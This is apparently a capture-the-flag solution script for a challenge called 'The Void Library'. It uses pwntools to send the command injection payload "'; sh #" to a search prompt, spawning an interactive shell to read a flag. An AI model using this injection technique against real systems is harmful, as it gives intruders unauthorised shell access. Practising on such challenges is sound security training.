#!/usr/bin/env python3
"""
The Void Library - Command Injection Exploit
=============================================

Exploits command injection in the search function to spawn a shell.

Usage:
    python3 exploit.py          # Local
    python3 exploit.py REMOTE   # Remote
"""

from pwn import *
import sys

# Configuration
BINARY = "./voidlib"

# Remote server configuration
REMOTE_HOST = "ctf.neocyberrange.com"
REMOTE_PORT = 9004

context.log_level = "info"

def exploit():
    # Connect to target
    if len(sys.argv) >= 2 and sys.argv[1] == 'REMOTE':
        log.info(f"Connecting to {REMOTE_HOST}:{REMOTE_PORT}")
        p = remote(REMOTE_HOST, REMOTE_PORT)
    else:
        log.info(f"Starting local process: {BINARY}")
        p = process(BINARY)
    
    # Command injection payload
    payload = "'; sh #"
    
    # Wait for the search prompt
    p.recvuntil(b"[SEARCH] > ")
    
    # Send the payload
    log.info("Sending command injection payload...")
    p.sendline(payload.encode())
    
    # We should now have a shell!
    log.success("Got shell! Run 'cat flag.txt' to get the flag.")
    
    # Interactive shell
    p.interactive()

if __name__ == "__main__":
    exploit()
